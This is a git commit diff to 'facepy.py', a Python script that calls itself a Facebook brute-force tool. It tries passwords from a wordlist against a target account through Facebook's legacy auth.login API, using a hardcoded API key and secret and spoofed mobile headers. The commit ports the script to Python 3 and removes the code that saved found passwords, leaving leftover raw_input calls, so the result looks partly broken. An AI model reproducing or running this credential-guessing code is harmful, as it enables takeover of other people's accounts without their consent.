4d5af23f32b3c9d0c23994f2ca8682f4e3769790
black <63425602+AkNOwn389@users.noreply.github.com>
2022-06-12 15:33:27 +0800

    Add files via upload

--- facepy.py
+++ facepy.py
@@ -3,6 +3,7 @@ import os.path
 import requests,urllib,json
 import hashlib
 import sys,os,time
+session = requests.Session()
 logo=""" \033[1;92m   _    _
    / \  | | ___ __   _____      ___ __
   / _ \ | |/ / '_ \ / _ \ \ /\ / / '_ \
@@ -10,7 +11,7 @@ logo=""" \033[1;92m   _    _
  / ___ \|   <| | | | (_) \ V  V /| | | |
 /_/   \_\_|\_\_| |_|\___/ \_/\_/ |_| |_|
 Facebook BruteForce by Aknown:"""
-if sys.version_info[0] != 2:
+if sys.version_info[0] != 3:
   os.system('clear')
   print(logo)
   print(65 * '\033[1;92m=')
@@ -23,10 +24,10 @@ API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"
 header={'Host': 'api.facebook.com','Connection': 'keep-alive','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"','sec-ch-ua-mobile': '?1','ec-ch-ua-platformm': '"Android"','Upgrade-Insecure-Requests': '1','User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Sec-Fetch-Site': 'none','ec-Fetch-Modee': 'navigate','Sec-Fetch-User': '?1','Sec-Fetch-Dest': 'document','Accept-Encoding': 'gzip, deflate','Accept-Language': 'en-US,en;q=0.9'}
 def is_this_a_password(email, index, password):
   sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}".format(email,password.strip(),API_SECRET)
-  xx = hashlib.md5(sig).hexdigest()
+  xx = hashlib.md5(sig.encode('utf-8')).hexdigest()
   data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}".format(email,password.strip(),xx)
   try:
-    web = requests.get("https://api.facebook.com:443/restserver.php?{}".format(data),headers=header)
+    web = session.get("https://api.facebook.com:443/restserver.php?{}".format(data),headers=header)
   except:
     is_this_a_password(email, index, password)
   try:
@@ -55,14 +56,6 @@ def is_this_a_password(email, index, password):
     elif int(page['error_code']) == 613:
       print('\033[1;91m[+] Account Locked\n Maybe You already find Password!') 
       raw_input()
-      return True
-    else:
-      ok=open('temp', 'a')
-      ok.write(str(email+' | '+password))
-      ok.close()
-      print(65 * '\033[1;92m=')
-      print('[+] Password found: \033[1;97m '+password)
-      print(65 * '\033[1;92m=')
       return True
   except:
     pass
@@ -94,9 +87,9 @@ if __name__ == "__main__":
   print(logo)
   print(65 * '\033[1;92m=')
   print('\033[1;92mEmail/Username/Id/etc:')
-  email = raw_input('\033[1;94m==\033[1;92m>>> \033[1;91m').strip()
+  email = input('\033[1;94m==\033[1;92m>>> \033[1;91m').strip()
   print('\033[1;92m[+] Password File:')
-  PASSWORD_FILE = raw_input('\033[1;94m==\033[1;92m>>> \033[1;91m')
+  PASSWORD_FILE = input('\033[1;94m==\033[1;92m>>> \033[1;91m')
   if not os.path.isfile(PASSWORD_FILE):
     print("Password file not exist: ")
     sys.exit(0)
